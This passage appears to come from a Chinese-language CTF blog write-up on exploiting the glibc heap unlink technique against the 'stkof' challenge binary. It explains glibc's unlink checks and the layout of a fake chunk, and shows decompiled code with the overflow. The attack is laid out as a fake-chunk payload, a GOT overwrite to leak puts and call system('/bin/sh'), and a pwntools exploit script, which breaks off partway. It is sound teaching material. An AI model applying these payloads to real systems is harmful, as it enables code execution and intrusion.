<td><em>__</em></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<h3 id="glibc中的保护机制（ubuntu18-04堆有做修改）"><a href="#glibc中的保护机制（ubuntu18-04堆有做修改）" class="headerlink" title="glibc中的保护机制（ubuntu18.04堆有做修改）"></a>glibc中的保护机制（ubuntu18.04堆有做修改）</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-C"><code class="language-C">#由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr ("corrupted size vs. prev_size");
<p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p>
</code></pre>
<p>既然要满足这个条件还要成功利用可以考虑伪造一个chunk从而绕过该检查<br>32位时</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>fake chunk</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x30</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=ptr-0x12</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=ptr-0x8</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>此时</p>
<pre class=" language-C"><code class="language-C">chunk1 FD = fake_chunk_PRE_size = ptr - 0x12
chunk3 BK = fake_chunk_PRE_size=ptr - 0x8
</code></pre>
<p>满足</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">FD<span class="token operator">-></span>bk <span class="token operator">=</span> P 
BK<span class="token operator">-></span>fd <span class="token operator">=</span> P
</code></pre>
<p>64位时</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>fake chunk</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x30</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=ptr-0x18</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=ptr-0x10</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>此时</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>chunk1 FD = fake_chunk_PRE_size = ptr - 0x18
chunk3 BK = fake_chunk_PRE_size=ptr - 0x10
</code></pre><p>满足</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>FD-&gt;bk = P 
BK-&gt;fd = P
</code></pre><h2 id="查看题目-stkof"><a href="#查看题目-stkof" class="headerlink" title="查看题目 stkof"></a>查看题目 stkof</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_400C58</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v0 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v2 <span class="token operator">=</span> <span class="token function">edite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//creat chunk</span>
      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v2 <span class="token operator">=</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// free chunk</span>
        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v2 <span class="token operator">=</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//print </span>
        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v2 <span class="token operator">=</span> <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//creat chunk size</span>
      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>查看下每一个函数</p>
<h3 id="alloc"><a href="#alloc" class="headerlink" title="alloc"></a>alloc</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token function">atoll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//malloc size</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
ptr<span class="token punctuation">[</span><span class="token operator">++</span>dword_602100<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//指针存在于全局变量中 跟入++dword_60210即可查看到</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_602100<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="edite"><a href="#edite" class="headerlink" title="edite"></a>edite</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v2 <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0x100000</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v3 <span class="token operator">=</span> <span class="token function">atoll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
v4 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 无限制读入大小 可以无限制读入 导致溢出</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
  v4 <span class="token operator">+</span><span class="token operator">=</span> i<span class="token punctuation">;</span>
  v3 <span class="token operator">-</span><span class="token operator">=</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
  result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> result<span class="token punctuation">;</span>
</code></pre>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x100000</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//free chunk</span>
ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
</code></pre>
<p>那么存在堆溢出 并且无限制creat chunk and chunk size<br>满足unlink</p>
<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>既然知道了需要构造unlink ，所以来屡屡怎么操作<br>1.至少创建3个chunk（4个也可以，第四个chunk用来写/bin/sh\x00）<br>2.防止top chunk 合并导致无法利用<br>3.64位程序 fd bk满足条件 </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">fd <span class="token operator">=</span> ptr  <span class="token operator">-</span> <span class="token number">0x18</span>
bk <span class="token operator">=</span> ptr  <span class="token operator">-</span> <span class="token number">0x10</span>
</code></pre>
<p>4.注意ptr地址位全局变量地址+0x10（gdb调试可以看出）<br>5.leak出真实函数地址：puts atoi都可以<br>6.得到system函数地址<br>7.getshell</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/10gx 0x602140
0x602140:    0x0000000000000000    0x0000000000000000
0x602150:    0x0000000000e05a80    0x0000000000e05aa0
0x602160:    0x0000000000000000    0x0000000000000000
0x602170:    0x0000000000000000    0x0000000000000000
0x602180:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>发现指针地址从 0x602150可写<br>而全局变量地址位 0x602140 所以 ptr地址=  0x602140+0x10</p>
<p>创建4个small chunk</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">alloc（<span class="token number">0x80</span>） <span class="token operator">//</span>idx1 use to leak puts addr
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx2  overflow to write a fake chunk 
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx3 use to unlink
alloc（<span class="token number">0x80</span>）<span class="token operator">//</span>idx4 write <span class="token operator">/</span>bin<span class="token operator">/</span>sh\x00
</code></pre>
<p>fake chunk 构造</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">ptr <span class="token operator">=</span> <span class="token number">0x602140</span><span class="token operator">+</span><span class="token number">0x10</span>
fd <span class="token operator">=</span> ptr <span class="token operator">-</span><span class="token number">0x18</span>
bk <span class="token operator">=</span>ptr<span class="token number">-0x10</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk PRE_size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk size</span>
payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fake_chunk fd</span>
payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake_chunk bk</span>
payload <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token comment" spellcheck="true">#fake_string</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overflow fake_chunk</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overwrite chunk3 PRE_size</span>
edite<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#unlink fake chunk, now chunk2*ptr  =&amp;(chunk2*ptr) - 0x18 = ptr-0x10 - 8</span>
</code></pre>
<p>fgets接收的字符地址距离rsp 0x24<br>所以可以构造leak payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edite<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#overwrite </span>
edite<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write puts.plt</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak puts addr</span>
data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>接着计算出system地址 以及在chunk4中写入/bin/sh\x00</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">system <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#binsh = puts - libc.symbols['puts']+next(libc.search('/bin/sh'))</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free_got => system_got</span>
read_in<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'stkof'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"OK\n"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">read_in</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free_it</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
ptr <span class="token operator">=</span> <span class="token number">0x602140</span> <span class="token operator">+</span><span class="token number">0x10</span>
alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
alloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2</span>
alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3</span>
alloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 4</span>


payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk pre_size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake fd</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake bk</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow fake chunk</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow next chunk pre_size size</span>

read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>
payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

